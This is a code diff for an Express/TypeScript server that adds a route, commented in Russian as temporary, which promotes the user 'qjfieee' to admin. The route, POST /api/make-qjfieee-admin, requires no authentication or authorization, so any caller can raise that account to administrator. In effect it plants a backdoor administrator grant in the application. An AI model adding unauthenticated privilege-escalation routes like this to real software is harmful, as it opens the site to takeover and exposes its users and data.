@@ -78,6 +78,29 @@ export async function registerRoutes(app: Express): Promise<Server> {
     }
   });
 
+  // Временный роут для повышения qjfieee до админа
+  app.post("/api/make-qjfieee-admin", async (req, res) => {
+    try {
+      const user = await storage.getUserByUsername("qjfieee");
+      if (!user) {
+        return res.status(404).json({ message: "Пользователь qjfieee не найден" });
+      }
+
+      const updatedUser = await storage.updateUserRole(user.id, "admin");
+      res.json({ 
+        message: "Пользователь qjfieee теперь администратор", 
+        user: {
+          id: updatedUser?.id,
+          username: updatedUser?.username,
+          role: updatedUser?.role
+        }
+      });
+    } catch (error: any) {
+      console.error('Make admin error:', error);
+      res.status(500).json({ message: "Ошибка: " + error.message });
+    }
+  });
+
   const httpServer = createServer(app);
   return httpServer;
 }
